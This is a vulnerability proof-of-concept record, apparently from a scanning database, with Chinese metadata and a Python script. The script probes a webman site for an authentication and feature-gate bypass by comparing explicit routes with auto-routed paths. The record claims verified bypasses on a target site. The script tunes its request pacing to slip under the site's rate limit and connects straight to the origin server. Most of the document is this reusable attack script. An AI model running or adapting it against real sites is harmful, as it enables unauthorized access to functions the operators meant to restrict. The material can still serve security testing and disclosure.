# webman「显式路由 vs 自动路由」双姿势鉴权/闸门 oracle（可复用：一次判定整族方法被哪一层拦）

- **code**: webman-显式路由-vs-自动路由-双姿势鉴权-闸门-oracle-可复用-一次判定整族方法被哪一层拦
- **kind**: script
- **category**: auth-bypass
- **component**: webman 自动路由 / 交付版闸门 DeliveryMode
- **versions**: webman 默认自动路由开启 + 闸门只挂显式路由的部署
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com（源站 203.0.113.95，零凭证，间隔 5s）跑出三对成立：/api/v1/hemai/list=GATE(403) vs /api/hemai/list={"code":0,...list:[]}；/api/v1/yuebao/products=GATE(403) vs /api/yuebao/products={"code":0,"msg":"操作成功","data":[]}；/api/v1/rebate/tier-rates=GATE(403) vs /api/rebate/tierRates={"code":0,...,"data":{"list":[],"vendors":[]}}；对照组 /api/v1/collector/status 与 /api/collector/status 分别为 AUTH(10003) 与 webman404，/api/v1/zzz-nonexist-xyz 与 /api/zzz-nonexist-xyz 均为 NO_ROUTE。原始响应见 runs/vs2-probe6.txt / .json（vuln 30 证据）。
- **path**: pocs/webman-显式路由-vs-自动路由-双姿势鉴权-闸门-oracle-可复用-一次判定整族方法被哪一层拦/webman_dual_form_oracle.py
- **tags**: webman,自动路由,鉴权绕过,交付版闸门,oracle,example
- **created_at**: 2026-10-12T12:43:34.747Z
- **found_by**: vuln-scan

## 描述

webman 双姿势（显式路由 vs 自动路由）鉴权/闸门可达性 oracle：一次跑出"哪些方法被闸门或鉴权拦、哪些被自动路由整族跳过"

## 用法

```
python webman_dual_form_oracle.py —— 逐对打印显式路由与自动路由的判定；GATE(403) + ★IN_BODY 即构成闸门绕过。注意自动路由的方法名要用 PHP 驼峰（如 claim-jndpc28-loss-rebate → claimJndpc28LossRebate），控制器名用小写类名去掉 Controller。实测有效值见 verified_note。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""webman「双姿势」可达性 oracle —— 同一业务方法，显式路由 vs 自动路由 各打一次
用法:
  1) 改 HOST / PROXY / SRC 为靶标；本机若为 Clash fake-ip 环境必须 -x 代理 + --connect-to 源站
  2) 把 (显式路径, 自动路由路径) 成对填进 PAIRS，方法名按 PHP 的驼峰形式（/x/y-z → yZ）
  3) python oracle.py
判定口径（四分类，务必区分）:
   {"code":10003,"缺少认证信息"}   → 鉴权中间件拦（AuthMiddleware 生效）
   {"code":403,"该功能在交付版默认关闭"} → 交付版闸门拦（业务层闸门）
   webman 404 HTML(<div class="center">webman</div>) → 路由/控制器不存在
   其余（含 code:1/400/401/500、"缺少XX参数"） → **已进方法体** = 双闸门都被跳过
"""
import json, subprocess, tempfile, os, time

HOST, SRC, PROXY = "example.com", "203.0.113.95", "http://127.0.0.1:7892"
CURL = r"C:\Windows\System32\curl.exe"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/203.0.113.46 Safari/537.36")
GAP = 5.0          # 实测 ≥5s 可稳过该站 nginx 限速
LAST = [0.0]

PAIRS = [
    ("/api/v1/hemai/list", "/api/hemai/list"),
    ("/api/v1/yuebao/products", "/api/yuebao/products"),
    ("/api/v1/rebate/tier-rates", "/api/rebate/tierRates"),
    ("/api/v1/level-rewards/records", "/api/levelreward/getLevelConfigs"),
    ("/api/v1/collector/status", "/api/collector/status"),   # 对照组：两者都应被鉴权
    ("/api/v1/zzz-nonexist-xyz", "/api/zzz-nonexist-xyz"),    # 对照组：不存在
]


def hit(path, method="GET", body=None):
    d = time.time() - LAST[0]
    if d < GAP:
        time.sleep(GAP - d)
    LAST[0] = time.time()
    fdh, tmph = tempfile.mkstemp(); os.close(fdh)
    fdo, tmpo = tempfile.mkstemp(); os.close(fdo)
    args = [CURL, "-sS", "-k", "--http1.1", "-x", PROXY, "-A", UA,
            "-H", "Accept: */*", "-X", method, "--max-time", "25",
            "-D", tmph, "-o", tmpo, "--connect-to", f"{HOST}:443:{SRC}:443"]
    tmp = None
    if body is not None:
        b = json.dumps(body).encode()
        args += ["-H", "Content-Type: application/json"]
        fd, tmp = tempfile.mkstemp(); os.write(fd, b); os.close(fd)
        args += ["--data-binary", "@" + tmp]
    args.append(f"https://{HOST}{path}")
    subprocess.run(args, capture_output=True, timeout=40)
    head = open(tmph, "rb").read().decode("utf-8", "replace")
    txt = open(tmpo, "rb").read().decode("utf-8", "replace")
    for f in (tmph, tmpo, tmp):
        if f:
            try:
                os.unlink(f)
            except Exception:
                pass
    if "webman</div>" in txt or ('"msg": "404 Not Found"' in txt):
        return "NO_ROUTE", txt[:120]
    if "缺少认证信息" in txt or '"code":10003' in txt:
        return "AUTH(10003)", txt[:160]
    if "交付版默认关闭" in txt:
        return "GATE(403)", txt[:160]
    return "★IN_BODY", txt[:200]


for explicit, auto in PAIRS:
    a = hit(explicit)
    b = hit(auto)
    print(f"{explicit:38s} -> {a[0]:<12} {a[1]}")
    print(f"{auto:38s} -> {b[0]:<12} {b[1]}")
    if a[0] == "GATE(403)" and b[0] in ("★IN_BODY",):
        print("   ⚑ 闸门被自动路由绕过（同一业务方法）\n")
    else:
        print()

```
